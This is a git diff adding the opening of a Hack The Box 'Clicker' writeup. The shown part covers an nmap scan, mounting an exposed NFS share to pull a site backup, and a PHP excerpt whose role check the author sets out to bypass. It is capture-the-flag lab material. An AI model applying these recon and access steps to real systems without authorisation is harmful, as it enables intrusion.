@@ -1,10 +1,293 @@
 ---
-layout: encrypted
+layout: post
 title: Clicker HTB - Writeup
 categories: [HTB]
-tags: [htb,web,htb medium,linux]
+tags: [htb,web,htb medium,linux,crlf,rce,binary exploitation]
 image:
   path: /images/htb/medium/clicker/icon.png
-
-encrypted: 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
 ---
+
+Another Medium! Hopefully it doesn't kick my ass as much...
+
+**Machine created by:** [Nooneeye](https://app.hackthebox.com/users/166251)
+
+## Recon
+
+Port scan to start it off:
+
+```
+$ sudo nmap 10.10.11.232 --top-ports 2500
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 03:24 AEDT
+Nmap scan report for 10.10.11.232
+Host is up (0.077s latency).
+Not shown: 2496 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+2049/tcp open  nfs
+```
+
+And adding the `/etc/hosts` entry:
+
+```
+10.10.11.232 clicker.htb
+```
+
+Browsing the HTTP seems to be a clicker game with user registration, and a small game.
+
+![Main](/images/htb/medium/clicker/main.png)
+
+Looking at the ports there is also a NFS entry on port 2049, let's look into that.
+
+```
+$ showmount -e 10.10.11.232
+Exports list on 10.10.11.232:
+/mnt/backups                        *
+
+$ sudo mount -o resvport -t nfs 10.10.11.232:/mnt/backups /private/nfs
+$ ls /private/nfs
+clicker.htb_backup.zip
+$ cp /private/nfs/clicker.htb_backup.zip /tmp/
+```
+
+After looking at the share and finding a backup, inside the zip is a complete backup of the sites infrastructure with full PHP source code.
+
+I then looked in `save-game.php` and was looking at potentially injecting the `role` key.
+
+```php
+session_start();
+include_once("db_utils.php");
+
+if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
+	$args = [];
+	foreach($_GET as $key=>$value) {
+		if (strtolower($key) === 'role') {
+			// prevent malicious users to modify role
+			header('Location: /index.php?err=Malicious activity detected!');
+			die;
+		}
+		$args[$key] = $value;
+	}
+	save_profile($_SESSION['PLAYER'], $_GET);
+	// update session info
+	$_SESSION['CLICKS'] = $_GET['clicks'];
+	$_SESSION['LEVEL'] = $_GET['level'];
